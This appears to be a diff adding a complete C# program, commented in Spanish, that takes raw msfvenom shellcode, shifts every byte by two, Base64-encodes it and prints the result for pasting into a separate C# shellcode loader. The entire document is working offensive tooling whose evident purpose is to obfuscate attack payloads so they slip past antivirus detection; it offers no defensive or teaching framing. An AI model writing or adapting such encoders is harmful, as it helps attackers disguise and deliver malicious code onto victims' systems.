@@ -1,0 +1,50 @@
+using System;
+using System.IO;
+using System.Text;
+
+namespace ShellcodeEncoder
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            // ==================== CONFIGURACIÓN ====================
+            string rawFile = "shellcode.bin";     // Archivo raw de msfvenom
+            string encodedFile = "encoded_b64.txt"; // ← Ahora guarda en Base64
+
+            if (!File.Exists(rawFile))
+            {
+                Console.WriteLine($"[!] Error: No se encontró el archivo {rawFile}");
+                Console.ReadKey();
+                return;
+            }
+
+            byte[] buf = File.ReadAllBytes(rawFile);
+
+            // === Encoder: +2 a cada byte ===
+            byte[] encoded = new byte[buf.Length];
+            for (int i = 0; i < buf.Length; i++)
+            {
+                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xff);
+            }
+
+            // === Convertir a Base64 (una sola línea) ===
+            string base64Encoded = Convert.ToBase64String(encoded);
+
+            // Guardar solo el Base64 en el archivo
+            File.WriteAllText(encodedFile, base64Encoded);
+
+            // ==================== RESULTADO ====================
+            Console.WriteLine("[+] Shellcode codificado correctamente!");
+            Console.WriteLine("Payload guardado en: " + encodedFile);
+            Console.WriteLine("Longitud original     : " + buf.Length + " bytes");
+            Console.WriteLine("Longitud codificada   : " + encoded.Length + " bytes");
+            Console.WriteLine("\nBase64 listo para copiar:");
+            Console.WriteLine("--------------------------------------------------");
+            Console.WriteLine(base64Encoded);
+            Console.WriteLine("--------------------------------------------------");
+            Console.WriteLine("\n¡Listo! Copia el Base64 de arriba y pégalo en tu loader C#.");
+            Console.ReadKey();
+        }
+    }
+}
